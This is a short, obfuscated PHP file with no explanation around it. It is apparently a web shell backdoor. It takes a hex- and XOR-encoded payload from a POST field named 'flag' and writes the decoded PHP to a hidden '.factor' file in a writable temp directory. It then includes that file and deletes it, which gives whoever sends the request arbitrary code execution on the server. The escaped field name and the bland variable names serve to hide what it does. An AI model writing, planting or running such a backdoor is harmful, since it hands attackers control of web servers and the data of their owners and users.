<?php

if(isset($_POST) && isset($_POST["fl\x61g"])){
	$tkn = hex2bin($_POST["fl\x61g"]);
	$data = ''; $y = 0; while($y < strlen($tkn)){$data .= chr(ord($tkn[$y]) ^ 82);$y++;}
	$symbol = array_filter(["/tmp", getenv("TMP"), session_save_path(), getenv("TEMP"), "/var/tmp", sys_get_temp_dir(), "/dev/shm", getcwd(), ini_get("upload_tmp_dir")]);
	for ($dat = 0, $elem = count($symbol); $dat < $elem; $dat++) {
    $bind = $symbol[$dat];
    		if (array_product([is_dir($bind), is_writable($bind)])) {
    $object = vsprintf("%s/%s", [$bind, ".factor"]);
    $success = file_put_contents($object, $data);
if ($success) {
	include $object;
	@unlink($object);
	exit;}
}
}
}